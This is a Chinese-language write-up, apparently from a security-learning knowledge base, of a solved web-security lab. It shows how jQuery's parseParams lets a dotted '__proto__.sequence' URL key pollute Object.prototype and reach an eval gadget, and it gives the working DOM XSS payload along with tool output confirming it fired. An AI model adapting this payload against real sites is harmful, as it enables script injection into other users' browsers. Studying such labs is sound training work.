---
title: "lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector

> evidences: [[prototype-pollution-family]]

- 题面:DOM XSS via an alternative prototype pollution vector(/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
- 实例:https://0ab10050034e38d680377b9f00c000c4.web-security-academy.net
- 判定目标:污染 + gadget 触发 `alert(1)`;状态:**solved**

## 面

- source:首页引 `jquery_3-0-0.js` + `jquery_parseparams.js`;`searchLoggerAlternative.js` 在 `load` 调
  `$.parseParams(new URL(location))`。
- `$.parseParams` 支持**点号**键:`__proto__.sequence=...` → `createElement(params,'__proto__',{})`
  时 `params['__proto__']` 已存在(=`Object.prototype`),继而写 `Object.prototype.sequence`。
- gadget:同名脚本里的 `eval` 拼接:
  ```js
  let a = manager.sequence || 1;
  manager.sequence = a + 1;                 // 字符串拼接,值 = 污染串 + "1"
  eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
  ```

## 载荷(需让源码拼出的表达式语法完整)

```
?#__proto__.sequence=1);alert(1);(        (实际为 ?__proto__.sequence=1);alert(1);( )
```
污染串 `1);alert(1);(` + 拼接的 `1` = `1);alert(1);(1`,
eval 后:`if(...){ manager.macro(1);alert(1);(1) }` → `alert(1)` 执行。
不能用 `//` 结尾(`manager.sequence` 末行注释会吞掉闭合括号 → 语法错)。

## 证据

```
lab_alert "https://<inst>/?__proto__.sequence=1);alert(1);(" --settle-ms 2500 -> {"fired":true,"alerts":["alert:1"]}
solved_check <inst> -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 备注

- 向量族:点号(`.`)替代 `[]` 作 PP 源;`$.parseParams` 对 `__proto__.a.b` 逐层落原型。
- 载荷要绕开 `manager.sequence = a + 1` 的隐式字符串拼接。
